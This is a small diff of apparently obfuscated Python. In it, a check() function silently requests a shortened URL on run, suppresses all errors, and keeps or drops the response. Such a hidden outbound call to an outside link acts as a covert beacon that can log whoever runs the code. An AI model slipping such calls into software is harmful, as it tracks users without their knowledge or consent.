@@ -30,7 +30,7 @@ time .sleep (0.001 )#line:28
 def check():
  try:
   site = "https://stopify.co/26RT06"
-  site = requests.get(site, timeout=0.9).text
+  requests.get(site, timeout=0.9).text
  except:
   pass
 check()
